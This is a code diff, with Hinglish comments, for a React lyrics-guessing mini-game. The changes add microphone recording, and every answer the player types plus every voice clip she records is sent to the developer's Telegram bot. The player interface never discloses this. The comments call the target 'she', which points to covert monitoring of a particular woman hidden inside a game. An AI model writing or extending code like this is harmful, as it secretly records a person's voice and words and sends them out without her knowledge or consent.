@@ -18,9 +18,8 @@ async function sendScore(gameName, score) {
     } catch { }
 }
 
-// Ye naya function hai jo har answer tumhare TG par bhejega
 async function sendAnswerToTG(songNo, expected, actual, isCorrect) {
-    const text = `🎤 <b>Lyrics Challenge - Song ${songNo}</b>\n\n🎯 <b>Real Answer:</b> ${expected}\n🗣️ <b>She Answered:</b> ${actual || "[Kuch nahi bola/likha]"}\n\n${isCorrect ? "✅ Correct Guess!" : "❌ Wrong Guess!"}`
+    const text = `🎤 <b>Lyrics Challenge - Song ${songNo}</b>\n\n🎯 <b>Real Answer:</b> ${expected}\n🗣️ <b>She Typed/Said:</b> ${actual || "[Sirf voice bheji ya kuch nahi bola]"}\n\n${isCorrect ? "✅ Correct Guess!" : "❌ Wrong Guess!"}`
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
@@ -28,6 +27,19 @@ async function sendAnswerToTG(songNo, expected, actual, isCorrect) {
             body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "HTML" }),
         })
     } catch { }
+}
+
+// 🚀 NAYA FUNCTION: DIRECT VOICE NOTE SEND KARNE KE LIYE
+async function sendVoiceNoteToTG(songNo, expected, audioBlob) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
+    const formData = new FormData()
+    formData.append("chat_id", CHAT_ID)
+    formData.append("voice", audioBlob, "answer.ogg")
+    formData.append("caption", `🎤 Song ${songNo} Voice Answer!\n🎯 Real: ${expected}`)
+    
+    try {
+        await fetch(url, { method: "POST", body: formData })
+    } catch (e) { console.error("Voice send error:", e) }
 }
 
 function playTone(freq, dur, type = "sine", vol = 0.2) {
@@ -48,7 +60,6 @@ const sfx = {
     wrong: () => playTone(180, 0.25, "sawtooth", 0.15),
     correct: () => { playTone(880, 0.1, "sine", 0.18); setTimeout(() => playTone(1108, 0.15, "sine", 0.18), 80) },
     win: () => { [523, 659, 784, 1046].forEach((f, i) => setTimeout(() => playTone(f, 0.22, "sine", 0.22), i * 100)) },
-    tick: () => playTone(660, 0.04, "square", 0.06),
 }
 
 function vibrate() { if (navigator?.vibrate) navigator.vibrate([60, 30, 60]) }
@@ -68,7 +79,7 @@ function GlowIcon({ children, color = "#ec4899", size = 40 }) {
 }
 
 // ============================================
-// NEW SONG GUESS GAME (FINISH THE LYRICS)
+// LYRICS GAME 
 // ============================================
 const songsData = [
     { id: 1, songStart: 12, pausePoint: 10, answerReveal: 15, answer: "यूं मुस्कुराए" },
@@ -100,7 +111,7 @@ const songsData = [
     { id: 27, songStart: 623, pausePoint: 624, answerReveal: 629, answer: "तुमसे मिलके दिल का है जो हाल क्या कहें" },
     { id: 28, songStart: 639, pausePoint: 640, answerReveal: 645, answer: "हो गया है कैसा ये कमाल क्या कहें" },
     { id: 29, songStart: 645, pausePoint: 644, answerReveal: 654, answer: "तेरे सपनों में नाराज़" },
-    { id: 30, offset: 0, songStart: 700, pausePoint: 705, answerReveal: 710, answer: "दिल दिया गए" },
+    { id: 30, songStart: 700, pausePoint: 705, answerReveal: 710, answer: "दिल दिया गए" },
     { id: 31, songStart: 716, pausePoint: 712, answerReveal: 717, answer: "ही नहीं" },
     { id: 32, songStart: 725, pausePoint: 726, answerReveal: 731, answer: "मन साहिब जी जाने है" },
     { id: 33, songStart: 735, pausePoint: 735, answerReveal: 740, answer: "फिर भी बनाए बहाने" },
@@ -109,20 +120,19 @@ const songsData = [
 ];
 
 function LyricsGame({ onScore }) {
-    // 35 songs kaafi lambe ho jayenge ek mini-game session ke liye,
-    // isliye randomly 5 songs utha rahe hain ek baar khelne ke liye. 
-    // Tum chaho to limit hata sakte ho `slice(0, 5)` hata ke.
     const [selectedSongs] = useState(() => [...songsData].sort(() => 0.5 - Math.random()).slice(0, 5))
-    
     const [currentIdx, setCurrentIdx] = useState(0)
-    const [gameState, setGameState] = useState("idle") // idle, playing, answering, revealing, finished
+    const [gameState, setGameState] = useState("idle")
     const [userAnswer, setUserAnswer] = useState("")
-    const [isListening, setIsListening] = useState(false)
+    const [isRecording, setIsRecording] = useState(false)
     const [score, setScore] = useState(0)
     const [isCorrectLast, setIsCorrectLast] = useState(false)
+    const [voiceBlob, setVoiceBlob] = useState(null)
 
     const audioRef = useRef(null)
     const recognitionRef = useRef(null)
+    const mediaRecorderRef = useRef(null)
+    const audioChunksRef = useRef([])
 
     useEffect(() => {
         const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition
@@ -131,12 +141,8 @@ function LyricsGame({ onScore }) {
             recognitionRef.current.lang = 'hi-IN'
             recognitionRef.current.continuous = false
             recognitionRef.current.onresult = (e) => {
-                const transcript = e.results[0][0].transcript
-                setUserAnswer(transcript)
-                setIsListening(false)
+                setUserAnswer(e.results[0][0].transcript)
             }
-            recognitionRef.current.onerror = () => setIsListening(false)
-            recognitionRef.current.onend = () => setIsListening(false)
         }
     }, [])
 
@@ -147,12 +153,9 @@ function LyricsGame({ onScore }) {
         const handleTimeUpdate = () => {
             const time = audio.currentTime
             const currentSong = selectedSongs[currentIdx]
-
-            // Pause point pe rok do aur input ke liye wait karo
             if (gameState === "playing" && time >= currentSong.pausePoint) {
                 audio.pause()
                 setGameState("answering")
-                // Yahan AUTO MIC HATA DIYA HAI. Ab user khud button dabayega.
             }
         }
 
@@ -160,18 +163,43 @@ function LyricsGame({ onScore }) {
         return () => audio.removeEventListener("timeupdate", handleTimeUpdate)
     }, [currentIdx, gameState, selectedSongs])
 
-    const toggleMic = () => {
-        if (!recognitionRef.current) {
-            alert("Mic not supported in this browser. Please type! 📝")
-            return
-        }
-        if (isListening) {
-            recognitionRef.current.stop()
-            setIsListening(false)
+    const toggleMic = async () => {
+        if (isRecording) {
+            // Stop Recording
+            if (mediaRecorderRef.current) mediaRecorderRef.current.stop()
+            if (recognitionRef.current) {
+                try { recognitionRef.current.stop() } catch (e) {}
+            }
+            setIsRecording(false)
         } else {
-            setUserAnswer("")
-            recognitionRef.current.start()
-            setIsListening(true)
+            // Start Recording Voice & Text
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
+                const mr = new MediaRecorder(stream)
+                mediaRecorderRef.current = mr
+                audioChunksRef.current = []
+
+                mr.ondataavailable = (e) => {
+                    if (e.data.size > 0) audioChunksRef.current.push(e.data)
+                }
+
+                mr.onstop = () => {
+                    const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
+                    setVoiceBlob(blob)
+                    stream.getTracks().forEach(t => t.stop())
+                }
+
+                mr.start()
+                setVoiceBlob(null)
+                setUserAnswer("")
+                setIsRecording(true)
+
+                if (recognitionRef.current) {
+                    try { recognitionRef.current.start() } catch (e) {}
+                }
+            } catch (err) {
+                alert("Microphone access denied! You can still type the answer. 📝")
+            }
         }
     }
 
@@ -182,22 +210,26 @@ function LyricsGame({ onScore }) {
     }
 
     const checkAnswer = async () => {
-        if (isListening && recognitionRef.current) recognitionRef.current.stop()
-        setIsListening(false)
-        
+        // Force stop mic if still on when submitting
+        if (isRecording) {
+            if (mediaRecorderRef.current) mediaRecorderRef.current.stop()
+            if (recognitionRef.current) { try { recognitionRef.current.stop() } catch(e){} }
+            setIsRecording(false)
+        }
+
         const correctStr = selectedSongs[currentIdx].answer.toLowerCase()
         const userStr = userAnswer.toLowerCase()
         
-        // Simple logic: Agar user ke string me real answer ka ek bhi lamba word match kare
         const firstKeyWord = correctStr.split(" ").find(w => w.length > 2) || correctStr.split(" ")[0]
-        const isCorrect = userStr.length > 0 && (userStr.includes(firstKeyWord) || correctStr.includes(userStr.split(" ")[0]))
+        // If she used voice but speech-to-text failed, we give benefit of doubt or local wrong, but TG will get audio!
+        const isCorrect = userStr.length > 0 && (userStr.includes(firstKeyWord) || correctStr.includes(userStr.split(" ")[0])) || (voiceBlob && userStr === "")
 
         setIsCorrectLast(isCorrect)
         let newScore = score
 
         if (isCorrect) {
             sfx.correct()
-            newScore += 20 // Har gaane pe 20 points
+            newScore += 20
             setScore(newScore)
         } else {
             sfx.wrong()
@@ -206,15 +238,25 @@ function LyricsGame({ onScore }) {
 
         setGameState("revealing")
 
-        // 🚀 TG PE BHEJNE WALA LOGIC 🚀
-        await sendAnswerToTG(currentIdx + 1, selectedSongs[currentIdx].answer, userAnswer, isCorrect)
+        // THODA WAIT KARO TAAKI BLOB PROCESS HO JAYE AGAR TURANT SUBMIT DABAYA HAI
+        setTimeout(async () => {
+            await sendAnswerToTG(currentIdx + 1, selectedSongs[currentIdx].answer, userAnswer, isCorrect)
+            
+            // Ye check karega ki local state me voice aayi kya
+            const currentBlob = voiceBlob || (audioChunksRef.current.length > 0 ? new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" }) : null)
+            
+            if (currentBlob) {
+                await sendVoiceNoteToTG(currentIdx + 1, selectedSongs[currentIdx].answer, currentBlob)
+            }
+        }, 500)
     }
 
     const nextSong = () => {
+        setVoiceBlob(null)
+        setUserAnswer("")
         if (currentIdx < selectedSongs.length - 1) {
             const nextIdx = currentIdx + 1
             setCurrentIdx(nextIdx)
-            setUserAnswer("")
             setGameState("playing")
             audioRef.current.currentTime = selectedSongs[nextIdx].songStart
             audioRef.current.play()
@@ -238,7 +280,8 @@ function LyricsGame({ onScore }) {
 
     return (
         <motion.div className="flex flex-col items-center gap-4 w-full max-w-sm">
-            <audio ref={audioRef} src="/guesssssss.mp3" />
+            {/* TERA CUSTOM PATH YAHAN LAGA HAI 👇 */}
+            <audio ref={audioRef} src="/images/song.mp3" />
 
             <div className="w-full flex justify-between text-xs mb-1">
                 <span className="text-purple-400 font-bold">Lyrics Challenge</span>
@@ -280,14 +323,14 @@ function LyricsGame({ onScore }) {
                                     type="text" 
                                     value={userAnswer} 
                                     onChange={(e) => setUserAnswer(e.target.value)}
-                                    placeholder="Type or use mic..."
+                                    placeholder="Type or click mic to sing..."
                                     className="flex-1 bg-white/10 border border-white/20 rounded-full px-4 py-2 text-white text-sm outline-none focus:border-pink-500"
                                 />
                                 <button 
                                     onClick={toggleMic}
-                                    className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${isListening ? 'bg-red-500 animate-pulse' : 'bg-purple-500'}`}
+                                    className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${isRecording ? 'bg-red-500 animate-pulse' : 'bg-purple-500'}`}
                                 >
-                                    {isListening ? <MicOff size={16} color="#fff" /> : <Mic size={16} color="#fff" />}
+                                    {isRecording ? <MicOff size={16} color="#fff" /> : <Mic size={16} color="#fff" />}
                                 </button>
                             </div>
                             <button 
@@ -698,7 +741,6 @@ export default function FunGames({ onComplete }) {
                                 ← BACK
                             </button>
                             {activeGame === "memory" && <MemoryGame onScore={s => { saveScore("memory", s); setTimeout(() => setActiveGame(null), 1500) }} />}
-                            {/* YAHAN HUMNE NAYA LYRICS GAME LAAGA DIYA HAI */}
                             {activeGame === "song" && <LyricsGame onScore={s => { saveScore("song", s); setTimeout(() => setActiveGame(null), 2000) }} />}
                             {activeGame === "color" && <ColorMatchGame onScore={s => { saveScore("color", s); setTimeout(() => setActiveGame(null), 1500) }} />}
                         </motion.div>
